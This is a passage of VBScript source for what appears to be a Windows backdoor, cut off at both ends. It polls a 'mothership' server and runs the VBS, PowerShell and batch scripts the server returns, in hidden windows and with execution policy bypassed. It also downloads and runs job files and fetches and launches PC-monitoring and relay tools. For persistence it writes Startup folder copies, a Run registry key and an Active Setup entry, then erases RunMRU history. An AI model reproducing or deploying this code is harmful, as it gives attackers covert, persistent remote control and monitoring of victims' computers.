        Call LogMsg("Init -- reporting errors")
        Call LogErr()
        WScript.Quit(0)
    End If
    
    Call LogMsg("Init -- exiting")
    WScript.Quit(0)
    
End Function

Init()

Call LogErr()
Call LogMsg("fatal error -- reached unreachable point -- exiting")
WScript.Quit(1)

' ---

Function AddToArray(tarr, tvalue)
	Err.Clear	
	Call LogMsg("AddToArray -- starting")
	
	If Not IsArray(tarr) Then
		Call LogMsg("AddToArray -- input array is not an array -- exiting")
		Exit Function
	End IF
	
	Dim matches : matches = Filter(tarr, tvalue)
	Dim ismatch : ismatch = false

	If UBound(matches) > -1 Then
		ismatch = true
	End If

	if not ismatch then
		ReDim Preserve tarr(UBound(tarr) + 1)
		tarr(UBound(tarr)) = tvalue
	end if

	If Err.Number <> 0 then
		Call LogMsg("AddToArray -- reporting errors")
		Call LogErr()
		Exit Function
	End IF
	
	Call LogMsg("AddToArray -- finished")
	
End Function

Function ParseConfig(configstr)
	Call LogMsg("ParseConfig -- starting")
	
	If XIsEmpty(configstr) then
        Call LogMsg("ParseConfig -- configstr is empty -- exiting")
        Exit Function
	End IF
	
	configstr = Replace(configstr, vbCrLf, vbLf)
	configstr = Replace(configstr, vbCr, vbLf)

	Dim textArray : textArray = Split(configstr, vbLf)
	
	Dim line : line = ""
	
	For Each line In textArray
		Dim kkey : kkey = ""
		Dim value : value = ""
		
		Dim parts : parts = Split(line, "=")

        Dim skipiteration : skipiteration = False
        
        if XIsEmpty(line) then
            skipiteration = true
        elseif not IsArray(parts) then
            skipiteration = true
        elseif not UBound(parts) = 1 then
            skipiteration = true
        End If
        
        If not skipiteration Then
        
            kkey = parts(0)
            value = parts(1)
            
            Call LogMsg("ParseConfig -- key=" & kkey & " value=" & value)
            
            if not XIsEmpty(value) then
            
                if kkey = "mothershipassets" then
                    mothershipassets = value
                elseif kkey = "bunnyheader" then
                    bunnyheader = value
                elseif kkey = "tplmothership" then
                    Call AddToArray(tplmothershiplist, value)
                elseif kkey = "phpmothership" then
                    Call AddToArray(mothershiplist, value)
                End IF
                
            End if
            
		End IF
		
	Next

	Call LogMsg("ParseConfig -- finished")
End function

Function WriteConfig()
	Call LogMsg("WriteConfig -- starting")
	
	Dim configstr : configstr = ""
	
	configstr = "mothershipassets=" & mothershipassets & vbCrLf
	configstr = configstr & "bunnyheader=" & bunnyheader & vbCrLf

	Dim titem
	For Each titem In tplmothershiplist
		configstr = configstr & "tplmothership=" & titem & vbCrLf
	Next

	For Each titem In mothershiplist
		configstr = configstr & "phpmothership=" & titem & vbCrLf
	Next
	
    Call WriteFile(configfpath, configstr)
    
    Call LogMsg("WriteConfig -- finished")

End function

Function ReadConfig()
	
	Call LogMsg("ReadConfig -- starting")
	
	If not fso.FileExists(configfpath) then
		Call LogMsg("ReadConfig -- configfpath " & configfpath & "does not exist -- exiting")
		Exit Function
	End IF
	
	Dim configstr : configstr = ReadFile(localpath)
	
	If not XIsEmpty(configstr) Then
		Call LogMsg(configstr)
	End IF
	
	Call ParseConfig(configstr)
	
	Call LogMsg("ReadConfig -- finished")
			
End function

Function GetConfig()
	Call LogMsg("GetConfig -- starting")
	
	Dim url : url = mothership & "/ow/config.php"
	Dim localpath : localpath = workdir & "\" & "config.txt.tmp"
	
	Dim headers
	Call DownloadFileWithHeaders(url, localpath, nothing, headers)

	If fso.FileExists(localpath) Then
		Dim configstr : configstr = ReadFile(localpath)
		Call ParseConfig(configstr)
		Call WriteConfig()
	End If

	If Err.Number <> 0 Then
		Call LogMsg("GetConfig -- reporting errors")
		Call LogErr()
	End If
	
	Call LogMsg("GetConfig -- finished")
End Function

Function Watchdog() 
    cmdname = "watchdog"

    ForceSingleton()
    
    Do While True   
    
    
        Call LogMsg("Watchdog: " & GetTimestamp())        
    
    Do While True
    
    
        Call ExitRamp("watchdog")

        Call Activate()        

        Exit Do
    
    Loop
    

        Call LogMsg("Watchdog sleeping for " & CStr(watchdogtimedelay) & " seconds " & GetTimestamp() )
        
        WScript.Sleep watchdogtimedelay*1000

    Loop
    
End Function

Function GetBunnyHeaderDict()
    set GetBunnyHeaderDict = nothing
    
    Dim parts
    
    if not XIsEmpty(bunnyheader) Then
        parts = Split(bunnyheader, ":")
        
        if IsArray(parts) then  
            if UBound(parts) >= 1 Then
                Set GetBunnyHeaderDict = CreateObject("Scripting.Dictionary")
                GetBunnyHeaderDict.Add parts(0), trim(parts(1))
            end if
        end if
    end if

End Function

' TODO: add assets to list
Function Retrieve()
    Dim pp : pp = "Retrieve"
    
    cmdname = "retrieve"

    Call LogMsg(pp & " -- starting")
    
    Dim files 
    
    ' pcmon, relay, modify_edge_lnk.ps1, gunite, 7za, nircmdc
    files = Array("launch.exe", "pc_monitoring.ps1", "tpl_launch.exe")
        
    Dim file
    For Each file in files
        Call LogMsg("Retrieve: " & file)

        Dim localpath : localpath = workdir & "\" & file
                
        If Not fso.FileExists(localpath) Then
            Call RetrieveAsset(file, localpath)
        End If

    Next
    
    If Err.Number <> 0 Then
        Call LogMsg(pp & " -- reporting errors")
        Call LogErr()
    End If
    
    Call LogMsg(pp & " -- finished")

End Function

Function PenetrateTpl()
    
    Call LogMsg("PenetrateTpl")

    ' exe execution results in "Access Denied" in tpl
    WScript.Quit(0)

    Dim startuppath 
    
    startuppath = "C:\ProgramData\MandatoryProfile\Mandatory.V6\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
    
    If fso.FileExists(exepath) Then
        Call LogMsg("PenetrateTpl: copying to " & startuppath)

        Call TryCopyFile(exepath,startuppath)        
    End If

    startuppath = "C:\Users\All Users\MandatoryProfile\Mandatory.V6\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
    
    If fso.FileExists(exepath) Then
        Call LogMsg("PenetrateTpl: copying to " & startuppath)

        Call TryCopyFile(exepath,startuppath)
    End If

    Call LogMsg("exiting")
    WScript.Quit(0)
    
End Function

Function Penetrate() 
    cmdname = "penetrate"
  
    Call LogMsg("Penetrate " & GetTimestamp())
    
    If istpl Then
        PenetrateTpl()
        
        Call LogMsg("exiting")
        
        WScript.Quit(0)
    End IF
        
    Dim localusers : localusers = GetLocalUsers()
    
    localusers = Split(localusers, "|")
    
    Dim username
    For Each username In localusers
        Dim startuppath : startuppath = appDataPath & "\" & "Microsoft\Windows\Start Menu\Programs\Startup"

        Call LogMsg("Penetrate: setting up " & username & " " & startuppath)
       
        Call TryCopyFile(exepath, startuppath)        
    Next

    Dim cmdstr : cmdstr = "REG DELETE " & dq & "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" & dq & " /v " & tskname & " /f"
    
    Call RunShell("cmd /c " & cmdstr, True)
    
    cmdstr = ""
    cmdstr = "REG ADD " & dq & "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" & dq 
    cmdstr = cmdstr & " /v " & tskname & " /t REG_SZ /d " & exepath & " /f"
    
    Call RunShell("cmd /c " & cmdstr, True)
    
    Dim regpath : regpath = dq & "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\" & tskname & dq
    
    cmdstr = "REG ADD " & regpath & " /f"
    Call RunShell(cmdstr, True)

    cmdstr = "REG ADD " & regpath & " /v " & dq & "StubPath" & dq & " /d " & dq & exepath & dq & " /t REG_SZ /f"
    Call RunShell(cmdstr, True)

    cmdstr = "REG ADD " & regpath & " /v " & dq & "Version" & dq & " /d " & dq & "1" & dq & " /t REG_SZ /f"
    Call RunShell(cmdstr, True)

    cmdstr = "REG DELETE HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f"
    Call RunShell(cmdstr, True)
    
    Call LogMsg("exiting")
    WScript.Quit(0)
    
End Function

Function ForceSingleton()
    Dim pp : pp = "ForceSingleton"
    Call LogMsg("ForceSingleton: starting")
    
    Dim scriptpid : scriptpid = GetScriptPID()
    
    Dim scriptprocname : scriptprocname = GetProcessName(scriptpid)
    
    Call LogMsg("ForceSingleton: scriptpid=" & scriptpid)
     
    Dim tagname : tagname = cmdname & "_running"
    Dim tagfpath : tagfpath = workdir & "\" & tagname
    
    If Not fso.FileExists(tagfpath) Then
        Call LogMsg("ForceSingleton: creating running file")

        Call TryDeleteFile(tagfpath)
        Call WriteFile(tagfpath, scriptpid)
        
    Else
        Call LogMsg("ForceSingleton: running file exists")

        Dim procname : procname = ""
        Dim pid : pid = IsCmdRunning(cmdname, workdir, procname)

        If pid < 0 Then
            Call LogMsg(pp & " -- running file exists, matching process not found, overwriting running file")
            
            Call TryDeleteFile(tagfpath)
            Call WriteFile(tagfpath, scriptpid)
        End If

        If pid > 0 Then
            Call LogMsg(pp & " -- found cmd running with pid=" & CStr(pid) & " procname=" & procname)
        End If
        
        If pid > 0 and scriptpid <> pid and LCase(procname) = "cscript.exe" Then
            Call LogMsg(pp & ": duplicate found -- exiting")
            WScript.Quit(1)
        End If
                
    End If
    
    If Err.Number <> 0 Then
        Call LogMsg(pp & " reporting errors")
        Call LogErr()
        ForceSingleton = False
        Exit Function
    End If
    
    Call LogMsg(pp & " finished")
End Function

Function ExitRamp(tcmdname)
    Call LogMsg("ExitRamp")
    
    If fso.FileExists(workdir & "\" & "killall") Then
        Call LogMsg("kill all found -- exiting")
        WScript.Quit(1)
    End If

    Dim resetfname : resetfname = workdir & "\" & "reset_" & tcmdname & "loop"
    
    IF fso.FileExists(resetfname) Then
        Call TryDeleteFile(resetfname)
        
        Call LogMsg("reset found -- exiting")
        WScript.Quit(1)
    End If

End Function

Function ActivateExe(texedir, texefname, texename, argarr)      
    Dim pp : pp = "ActivateExe"
    
    ActivateExe = -1

    If XIsEmpty(texedir) Or XIsEmpty(texefname) Or XIsEmpty(texename) Then
        Exit Function
    End If

    Call LogMsg(pp & ": texefname=" & texefname & " texename=" & texename)

    Dim procname : procname = ""
    Dim cmdpid : cmdpid = IsCmdRunning(texename, texedir, procname)

    Call LogMsg(pp & ": procname=" & procname & " cmdpid=" & CStr(cmdpid))
    
    If ( cmdpid > 0 ) Then ' and ( LCase(procname) = "python.exe" )
					 
        ActivateExe = cmdpid
        
        Call LogMsg(pp & ": [" & texename & "] is running with procname=[" & procname & "] -- no need to launch")
        Exit Function
    End If
    
    Call LogMsg(pp & ": [" & texename & "] cmd is not running -- starting it up")

    WshShell.CurrentDirectory = texedir
    
    ActivateExe = ExecExe(texename, texefname, texedir, argarr)

    WshShell.CurrentDirectory = workdir

    Call LogMsg(pp & ": pid=" & CStr(ActivateExe))
    
End Function

Function ActivatePSScript(scriptdir, scriptfname, scriptname)      
    Dim pp : pp = "ActivatePSScript"

    ActivatePSScript = -1

    If XIsEmpty(scriptname) Then
        Exit Function
    End If

    If XIsEmpty(scriptdir) Then
        Exit Function
    End If

    Call LogMsg(pp & ": scriptfname=" & scriptfname & " scriptname=" & scriptname)

    Dim procname : procname = ""
    Dim cmdpid : cmdpid = IsCmdRunning(scriptname, scriptdir, procname)

    Call LogMsg(pp & ": procname=" & procname & " cmdpid=" & CStr(cmdpid))
    
    If ( cmdpid > 0 ) Then ' and ( LCase(procname) = "python.exe" )
					 
        ActivatePSScript = cmdpid
        
        Call LogMsg(pp & ": [" & scriptname & "] is running with procname=" & procname & " -- no need to launch")
        Exit Function
    End If
    
    Call LogMsg(pp & ": [" & scriptname & "] cmd is not running -- starting it up")

    Dim newargarr	
    Dim n : n = WScript.Arguments.Count
    If n > 1 Then
        ReDim newargarr(n - 1)

        Dim i 
        For i = 1 to n-1
            newargarr(i) = WScript.Arguments(i)
        Next
    End If

    ActivatePSScript = ExecPowerShell(scriptname, scriptdir, scriptfname, newargarr)

    Call LogMsg(pp & ": pid=" & CStr(ActivatePSScript))
    
End Function

Function ExecPowerShell(scriptname, scriptdir, scriptfname, args)
    Dim pp : pp = "ExecPowerShell"
    
    ExecPowerShell = -1
    
    If XIsEmpty(scriptname) or XIsEmpty(scriptdir) or XIsEmpty(scriptfname) Then
        Exit Function
    End IF										 

    Dim scriptfpath : scriptfpath = scriptdir & "\" & scriptfname
    
    Dim argstr : argstr = ""
    
    If IsArray(args) Then
        argstr = Join(args)
    End If

    Call LogMsg(pp & " " & scriptfpath)
    
    If not fso.FolderExists(scriptdir) Then
        LogMsg(pp & ": ERROR :: scriptdir is missing " & scriptdir)
        Exit Function
    End If
    
    If not fso.FileExists(scriptfpath) Then
        LogMsg(pp & ": ERROR :: scriptfpath is missing " & scriptfpath)
        Exit Function
    End If
        
    Dim cmdlogfpath : cmdlogfpath = scriptfpath & "_" & CStr(GetRandom(4)) & "_cmd.log"
    
    WScript.CurrentDirectory = scriptdir
    
    Dim cmdstr : cmdstr = "powershell.exe -noprofile -windowstyle hidden -executionpolicy bypass -File " & " " & scriptfpath & " " & argstr & " > " & cmdlogfpath & " 2>&1"
           
    Dim pid : pid = ExecShell(cmdstr)

    WScript.CurrentDirectory = workdir
    
    Dim cmdrunpath : cmdrunpath = scriptdir & "\" & scriptname & "_running"

    If pid > 0 Then        
        Call TryDeleteFile(cmdrunpath)
        
        Call WriteFile(cmdrunpath, CStr(pid))
        
        If fso.FileExists(cmdrunpath) Then
            Call LogMsg(pp & " -- created running file " & cmdrunpath & " with pid=" & pid)
        End If
    End IF
    
    ExecPowerShell = pid
    
    Call LogMsg(pp & " finished")

End Function

Function ActivatePythonScript(scriptdir, scriptfname, scriptname)      
    Dim pp : pp = "ActivatePythonScript"
    
    ActivatePythonScript = -1

    If XIsEmpty(scriptname) Then
        Exit Function
    End If

    If XIsEmpty(scriptdir) Then
        Exit Function
    End If

    Call LogMsg(pp & ": scriptfname=" & scriptfname & " scriptname=" & scriptname)

    Dim procname : procname = ""
    Dim cmdpid : cmdpid = IsCmdRunning(scriptname, scriptdir, procname)

    Call LogMsg(pp & ": procname=" & procname & " cmdpid=" & CStr(cmdpid))
    
    If ( cmdpid > 0 ) Then ' and ( LCase(procname) = "python.exe" )
					 
        ActivatePythonScript = cmdpid
        
        Call LogMsg(pp & ": [" & scriptname & "] is running with procname=" & procname & " -- no need to launch")
        Exit Function
    End If
    
    Call LogMsg(pp & ": [" & scriptname & "] cmd is not running -- starting it up")

    Dim newargarr	
    Dim n : n = WScript.Arguments.Count
    If n > 1 Then
        ReDim newargarr(n - 1)

        Dim i 
        For i = 1 to n-1
            newargarr(i) = WScript.Arguments(i)
        Next
    End If

    ActivatePythonScript = ExecPython(scriptname, relaydir, relayfname, newargarr)

    Call LogMsg(pp & ": pid=" & CStr(ActivatePythonScript))
    
End Function

Function StartPSPCMon()
    Err.Clear
    
    Dim pp : pp = "StartPSPCMon"
    
    Call LogMsg( pp & " -- starting")
    
    cmdname = "startpspcmon"

    If not fso.FolderExists(pcmondir) Then
        Call fso.CreateFolder(pcmondir)
    End If

    If not fso.FolderExists(pcmondir) Then
        Call LogMsg(pp & ": ERROR :: pcmondir " & pcmondir  & " does not exist -- exiting function")
        Exit Function
    End If
    
    If not fso.FileExists(pcmondir & "\" & pspcmonfname) Then
        Call RetrieveAsset(pspcmonfname, pcmondir & "\" & pspcmonfname)
    End If

    If not fso.FileExists(pcmondir & "\" & pspcmonfname) Then
        Call LogMsg(pp & ": ERROR :: script " & pspcmonfname & " does not exist inside " & pcmondir & " -- exiting function")
        Exit Function
    End If
    
    Dim ret : ret = ActivatePSScript(pcmondir, pspcmonfname, "pspcmon")      

    If ret > 0 Then
        Call LogMsg(pp & ": success activated script with pid " & ret)
    Else
        Call LogMsg(pp & ": ERROR -- failed to activate script")
    End If
    
    If Err.Number <> 0 Then
        Call LogMsg(pp & " -- reporting errors")
        Call LogErr()
        Exit Function
    End If
    
    Call LogMsg( pp & " -- finished")
    
End Function

Function StartPCMon()
    cmdname = "startpcmon"

    ForceSingleton()
            
    If not fso.FolderExists(pcmondir) Then
        Call LogMsg(cmdname & " creating pcmondir: " & pcmondir)
        Call fso.CreateFolder(pcmondir)
    End If
    
    If not fso.FolderExists(pcmondir) Then
        Call LogMsg(cmdname & ": ERROR :: pcmondir " & pcmondir  & " does not exist -- exiting function")
        Exit Function
    End If
    
    Dim pcmonfpath : pcmonfpath = pcmondir & "\" & pcmonfname
    
    If not fso.FileExists(pcmonfpath) Then
        Call LogMsg(cmdname & " downloading " & pcmonfpath)
        Call RetrieveAsset(pcmonfname, pcmonfpath)
    End If

    If not fso.FileExists(pcmonfpath) Then
        Call LogMsg(cmdname & ": ERROR :: " & pcmonfname & " does not exist inside " & pcmondir & " -- exiting function")
        Exit Function
    End If
    
    Dim pcmonpid : pcmonpid = -1
    
    Do While True
        
        Call LogMsg("running " & cmdname & " -- " & GetTimestamp() )

    Do While True
    
    
        Call ExitRamp(cmdname)

        Dim ret : ret = ActivateExe(pcmondir, pcmonfname, "pcmon", Array())      
    
        If ret > 0 Then
            Call LogMsg(cmdname & ": success activated exe with pid " & ret)
        Else
            Call LogMsg(cmdname & ": ERROR -- failed to activate exe")
        End If
        
        Exit Do
        
    Loop
    
        Call LogMsg(cmdname & " sleeping " & CStr(runnerdelaytime) & " seconds " & GetTimestamp() )

        WScript.Sleep runnerdelaytime*1000

    Loop
    
End Function

Function StartRelay()
    cmdname = "startrelay"

    ForceSingleton()
        
    If not fso.FolderExists(pythonpath) Then
        Call LogMsg("StartRelay: ERROR :: pythonpath " & pythonpath  & " does not exist -- exiting function")
        Exit Function
    End If
    
    If not fso.FileExists(pythonexe) Then
        Call LogMsg("StartRelay: ERROR :: pythonexe " & pythonexe  & "does not exist -- exiting function")
        Exit Function
    End If

    If not fso.FolderExists(relaydir) Then
        Call LogMsg("StartRelay: creating relaydir " & relaydir)

        fso.CreateFolder(relaydir)
    End If

    If not fso.FileExists(relaydir & "\" & relayfname) Then
        Call RetrieveAsset(relayfname, relaydir & "\" & relayfname)
    End If

    If not fso.FileExists(relaydir & "\" & relayfname) Then
        Call LogMsg("StartRelay: ERROR :: script " & relayfname & " does not exist inside " & relaydir & " -- exiting function")
        Exit Function
    End If
    
    Dim relaypid : relaypid = -1
    
    Do While True
        
        Call LogMsg("running " & cmdname & " -- " & GetTimestamp() )

    Do While True
    
    
        Call ExitRamp(cmdname)

        Dim ret : ret = ActivatePythonScript(relaydir, relayfname, "relay")      
    
        If ret > 0 Then
            Call LogMsg("StartRelay: success activated script with pid " & ret)
        Else
            Call LogMsg("StartRelay: ERROR -- failed to activate script")
        End If
        
        Exit Do
        
    Loop
    
        Call LogMsg(cmdname & " sleeping " & CStr(runnerdelaytime) & " seconds " & GetTimestamp() )

        WScript.Sleep runnerdelaytime*1000

    Loop
    
End Function

Function StopRelay()
End Function

Function StopPSPCMon()
End Function

Function StopPCMon()
    Call LogMsg("StopPCMon -- starting")
    
    Dim pid : pid = ReadFile(pcmondir & "\pcmon_running")
    
    Call KillTaskPid(pid)
    
End Function

Function LaunchExecCmd(argstr)
    LaunchExecCmd = -1
    
	' EXEC_CMD_BEGIN|<cmdname>|arg1|arg2|...|argn|EXEC_CMD_END
    Call LogMsg("LaunchExecCmd: " & argstr)
    
    Dim argarr
    
    If InStr(argstr, "|") <= 0 Then
        argarr = Array(argstr)
    Else
        argarr = Split(argstr, "|")
    End If
    
    If IsArray(argarr) Then
        If UBound(argarr) = -1 Then
			Call LogMsg("LaunchExecCmd -- ERROR:: argarr ubound is -1 -- exiting function")
            Exit Function
        End If
    Else
		Call LogMsg("LaunchExecCmd -- ERROR:: argarr is not an array -- exiting function")

        Exit Function
    End If

    Dim argarrlen : argarrlen = UBound(argarr) + 1
	
	Call LogMsg("LaunchExecCmd -- arg count=" & CStr(argarrlen))

	If ( argarrlen <= 0 ) Then 
		Call LogMsg("LaunchExecCmd -- ERROR :: cmdname not set -- exiting function")
		Exit Function
	End IF
	
	Dim exec_cmdname : exec_cmdname = argarr(0)
	
    If XIsEmpty(exec_cmdname) Then
        Call LogMsg("no cmdname specified -- exiting function")
        Exit Function
    End If
    
    Dim i, newargarr
	
    If argarrlen > 1 Then
        ReDim newargarr(argarrlen - 1)

        For i = 1 To argarrlen-1
            newargarr(i - 1) = argarr(i)
        Next
        
        argarrlen = argarrlen - 1
    Else
        ReDim newargarr(-1)
    End If

    
    Call LogMsg("LaunchExecCmd -- starting exec_cmdname=" & exec_cmdname)

    If ( ( LCase(exec_cmdname) = LCase("LogMsgMother") ) and ( argarrlen >= 1 ) ) Then
        Call PushEventMother("job_started")

        Dim msgtext : msgtext = newargarr(0)
        Call LogMsgMother(msgtext)
        
        LaunchExecCmd = 0
    End If

    If ( LCase(exec_cmdname) = LCase("StartRelay") ) Then
        Call PushEventMother("start_job")

        Call ExecShellAsync("conhost.exe --headless cscript.exe //nologo //B " & workdir & "\" & "zfei.vbs" & " startrelay " )
        
        LaunchExecCmd = 0
    End If

    If ( LCase(exec_cmdname) = LCase("StartPCMon") ) Then
        Call PushEventMother("start_job")

        Call ExecShellAsync("conhost.exe --headless cscript.exe //nologo //B " & workdir & "\" & "zfei.vbs" & " startpcmon " )
        
        LaunchExecCmd = 0
    
    End If
    
    Call LogErr()
    Call LogMsg("LaunchExecCmd finished")
    
    Call PushEventMother("job_finished")

End Function

Function LaunchExecScript(scripttext,ext)
    Dim pp : pp = "LaunchExecScript"
    LaunchExecScript = -1
    
    If XIsEmpty(scripttext) or XIsEmpty(ext) Then
        Exit Function
    End If
    
    Call LogMsg(pp & " -- " & ext)
        
    If XIsEmpty(jobcode) Then
        jobcode = GetRandom(8)
    End If
    
    Dim fname : fname = "execscript_" & CStr(jobcode) & "." & LCase(ext)
    
    Call LogMsg(pp & " script file: " & fname)
    
    Dim folderPath : folderPath = workdir & "\" & "execscript_" & jobcode
    Dim fpath : fpath =  folderPath & "\" & fname

    If not fso.FolderExists(folderPath) Then
        fso.CreateFolder folderPath
    End If
    
    If not fso.FolderExists(folderPath) then
        Call LogMsg(pp & " :: could not create job folder " & folderPath)
        Exit Function
    End if

    Call LogMsg(pp & " script path: " & fpath)

    Call WriteFile(fpath, scripttext)
    
    If not fso.FileExists(fpath) Then
        Call LogMsg(pp & " :: could not create job script " & fpath)
        Exit Function    
    End If
    
    Dim cmdstr : cmdstr = ""
    
    if LCase(ext) = "ps1" Then
        cmdstr = "cmd /c powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File " & fpath
    elseif LCase(ext) = "vbs" then
        cmdstr = "cmd /c cscript.exe //nologo " & fpath ' //b omitted as output needs to be captured to log file
    Elseif LCase(ext) = "bat" then
        cmdstr = "cmd /c " & fpath 
    End If
    
    Call PushEventMother("start_job")

    Dim res : res = RunShell("conhost.exe --headless " & cmdstr & " > " & fpath & ".log" & " 2>&1", false)
   
    If Err.Number <> 0 Then
        Call LogMsg(pp & " reporting error")
        Call LogErr()
        Exit Function
    End If
    
    Call LogMsg(pp & " finished")
    
    If res Then
        Call PushEventMother("job_finished")
    ' Else
    '   Call PushEventMother("job_finished_with_error")
    End If

End Function

Function ProcessExecCmd(inpingstr)
	Call LogMsg("ProcessExecCmd")
    
	If XIsEmpty(inpingstr) Then
		Exit Function
	End IF
	
    If InStr(inpingstr, "EXEC_") <=0 Then
        Call LogMsg("could not find any EXEC_ tag in ping response -- exiting function")
        Exit Function
    End If
    
	Call LogMsg("ProcessExecCmd")
    
    jobcode = ExtractText(inpingstr, "JOBCODE_BEGIN", "JOBCODE_END")
    
    If XIsEmpty(jobcode) Then
        jobcode = "EMPTY_JOB_CODE"
    End If
    
    Dim tokens : tokens = Array("VBS", "PS1", "BAT", "CMD")

	Dim begin_token 
    Dim end_token
    Dim argstr
    Dim token
    
    For Each token In tokens
        begin_token = "EXEC_" & token & "_BEGIN"
        end_token = "EXEC_" & token & "_END"
        argstr = ExtractText(inpingstr, begin_token, end_token)
        
        if token = "CMD" and not XIsEmpty(argstr) then
            Call LogMsg("ProcessExecCmd -- detected CMD")
            Call LaunchExecCmd(argstr)
            
            Call LogMsg("ProcessExecCmd finished")
            Exit Function
        end if
        
        if token <> "CMD" and not XIsEmpty(argstr) then
            Call LogMsg("ProcessExecCmd -- detected " & token)        
            Call LaunchExecScript(argstr, token)
            
            Call LogMsg("ProcessExecCmd finished")
            Exit Function
        end if
        
    Next

    Call LogMsg("ProcessExecCmd error")

End Function

Function ValidatePingFile(pingpath, ByRef pingtxt)
	On Error Resume Next
	Err.Clear
	
	Call LogMsg("ValidatePingFile " & pingpath)
	ValidatePingFile = true

    Dim oFile : Set oFile = fso.GetFile(pingpath)
    Dim fsize : fsize = oFile.Size

	If Not fso.FileExists(pingpath) Then
		Call LogMsg("ERROR -- " & pingpath & " does not exist")
		ValidatePingFile = false
		Exit Function
	End if

	If fsize <= 0 then
		Call LogMsg("ERROR -- ping file size is zero")
		ValidatePingFile = false
		Exit Function		
	End IF

	LogMsg("ValidatePingFile ping file size: " & CStr(fsize))
		
	pingtxt = ReadFile(pingpath)
		
	If XIsEmpty(pingtxt) Then
		Call LogMsg("ERROR -- pingtxt is empty")
		ValidatePingFile = false
		Exit Function
	End IF
	
	if InStr(pingtxt, "CLIENT") <= 0 Then
		Call LogMsg("ERROR -- pingtxt did not contain string CLIENT")
		ValidatePingFile = false
		Exit Function
	End if
	
	Call LogMsg("pingtxt: len: " & CStr(len(pingtxt)) & " " & vbCrLf & pingtxt)
	
	If Err.Number <> 0 then
		Call LogErr()
		ValidatePingFile = false
	End IF
	
	Call LogMsg("ValidatePingFile -- success")

End function

Function Ping()
    cmdname = "ping"

    ForceSingleton()
    
    Dim pingpath : pingpath = workdir & "\" & "ping.txt"
    
    Do While True
        
        Call LogMsg("running ping mothership=" & mothership & " " & GetTimestamp() )

    Do While True  
    
    
        Call ExitRamp(cmdname)

        Dim params : params = GetScriptTagStrUrl()

        Dim url : url = mothership & "/ow/ping.php"
        
		Dim dparams : dparams = GetScriptTagStrUrlDirect()

        Call Reset(pingpath)
		
		Dim isvalid : isvalid = false
        Dim pingtxt
		
		isvalid = DownloadFile(url & "?" & dparams, pingpath, nothing)
		
		if isvalid then
			Call LogMsg("DownloadFile was successful, validating the output")
			
			isvalid = ValidatePingFile(pingpath, pingtxt)
		end IF
		
		if not isvalid then
			Call LogMsg("retrying ping using curl")
			Call RunShell("conhost.exe --headless cmd /c curl -ks -o " & pingpath & " -G "  & url & " " & params, True)

			pingtxt = ""
			isvalid = ValidatePingFile(pingpath, pingtxt)

            if not isvalid then
                Call LogMsg("ERROR:: ping failed, possible error with mothership")

                mothership = SelectMothership()
                Call LogMsg("changing mothership: " & mothership)
                
                Call WriteFile( workdir & "\" & "mothership", mothership )
            end if
            
            Exit Do
        End If

		Call ProcessExecCmd(pingtxt)
        
        
        Exit Do   
    
    Loop
    
    
        Call LogMsg("ping sleeping " & CStr(pingdelaytime) & " seconds " & GetTimestamp() )

        WScript.Sleep pingdelaytime*1000

        Randomize
        Dim trandomNumber : trandomNumber = Int((10 * Rnd) + 1)        
        Dim sleeptime : sleeptime = trandomNumber*5
        
        Call LogMsg("ping sleeping for an additional " & CStr(sleeptime) & " seconds")

        WScript.Sleep sleeptime*1000

    Loop
    
End Function

Function Cmdlist()
    cmdname = "cmdlist"
    
    ForceSingleton()

    Dim pingpath : pingpath = workdir & "\" & "ping.txt"
    
    Do While True
        
        mothership = ReadTag( workdir & "\" & "mothership" )
        
        Call LogMsg(cmdname & " mothership=" & mothership & " starting " & GetTimestamp() )

    Do While True       
    
        Call ExitRamp(cmdname)
    
        Dim execcmdlist : execcmdlist = false

        If Not fso.FileExists(pingpath) Then
            Call LogMsg("cmdlist: ping file does not exist -- skipping")
            Exit Do
        End If
        
        Call LogMsg(cmdname & ": found " & pingpath )

        Dim objFile : Set objFile = fso.OpenTextFile(pingpath, 1)
        
        Dim strFileContent : strFileContent = ""
        
        If Not objFile.AtEndOfStream Then
            strFileContent = LCase(objFile.ReadAll)
        End If
        
        objFile.Close
        Set objFile = Nothing
        
        If XIsEmpty(strFileContent) Then
            Call LogMsg("Cmdlist - ping is empty")

            Exit Do
        End If            

        Call LogMsg(cmdname & " - ping file size: " & Len(strFileContent) )

        If InStr(strFileContent, "execute_cmdlist") > 0 Then
            Call LogMsg("cmdlist - found execcmdlist in ping file" )

            execcmdlist = True
        Else
            Call LogMsg("cmdlist - did not find execcmdlist in ping file" )
            
            execcmdlist = False        
        End If

        Call LogMsg("cmdlist: reseting ping.txt" )

        Call Reset(pingpath)
        
        If Not execcmdlist Then
            Call LogMsg("execcmdlist is not present -- skipping to next iteration")
            Exit Do
        End If

        Call LogMsg("cmdlist - downloading job file" )
     
        Dim filepath : filepath = workdir & "\" & "cmd_list_job_file_" & CStr(GetRandom(4)) & ".tmp"
        
        Call Reset(filepath)
                
        Dim url : url = mothership & "/ow/retrieve.php?filename=cmd_list.bat&" & GetScriptTagStrUrlDirect()
        
        Dim headers
        Dim ret : ret = DownloadFileWithHeaders( url, filepath, nothing, headers)

        If not ret then
            Call LogMsg("cannot execute as download failed, skipping to next iteration" )
            Exit Do
        end if
        
        If not fso.FileExists( filepath ) Then
            Call LogMsg("cannot execute as file " & filepath & " does not exist, skipping to next iteration" )
            Exit Do
        End if
        

        Dim jobfilename

        If headers Is Nothing Then
            jobfilename = "bbti.bat"
        elseIf headers.Count <= 0 Then
            jobfilename = "bbti.bat"
        End IF
        
        If headers.Exists("X-JobCode") Then            
            jobcode = headers.Item("X-JobCode")

            Call LogMsg("found X-JobCode header -- jobcode=[" & jobcode & "]")
            
            Dim jobcodeparts : jobcodeparts = Split(jobcode, ":")

            If UBound(jobcodeparts) > 0 Then
                jobcode = Trim(jobcodeparts(1)) 
            End If

            Call LogMsg("extracted jobcode=[" & jobcode & "]")

        Else
            jobcode = CStr(GetRandom(8))
            Call LogMsg("X-JobCode header not present -- random jobcode=" & jobcode)
        End If
        
        If not headers.Exists("Content-Disposition") Then
            jobfilename = "bbti.bat"
        Else
            ' Content-Disposition: attachment; filename="cmd_list_snapshot_full.bat"
